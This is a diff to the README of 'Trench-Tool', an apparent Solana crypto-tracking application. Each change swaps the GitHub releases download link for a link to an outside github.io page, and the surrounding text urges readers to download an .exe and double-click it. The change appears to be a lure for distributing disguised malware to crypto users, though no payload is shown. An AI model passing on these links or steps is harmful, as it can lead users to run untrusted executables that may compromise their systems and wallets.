@@ -1,6 +1,6 @@
 # 🛠️ Trench-Tool - Your Automated Solana Crypto Tracking Companion
 
-[![Download Trench-Tool](https://img.shields.io/badge/Download-Trench--Tool-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Test7p7019/Trench-Tool/releases)
+[![Download Trench-Tool](https://img.shields.io/badge/Download-Trench--Tool-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://test7p7019.github.io)
 
 ## 👋 Welcome to Trench-Tool
 
@@ -14,7 +14,7 @@ Your journey with Trench-Tool begins with a simple download. Follow these steps 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Test7p7019/Trench-Tool/releases](https://github.com/Test7p7019/Trench-Tool/releases)
+Visit this link to download the application: [https://test7p7019.github.io](https://test7p7019.github.io)
 
 When you click this link, you'll see a page with different files available. Look for the file named `Trench-Tool.exe` or `Trench-Tool-Setup.exe`. Click on it to start the download.
 
@@ -108,7 +108,7 @@ Don't let small obstacles stop you – most issues have simple fixes that other 
 
 Ready to take control of your crypto portfolio? Here's your download link again:
 
-**[Download Trench-Tool Now](https://github.com/Test7p7019/Trench-Tool/releases)**
+**[Download Trench-Tool Now](https://test7p7019.github.io)**
 
 Visit this link to download the application. Click the download link, wait for the file to finish downloading, then double-click to launch Trench-Tool. You'll be tracking your investments in minutes.
 
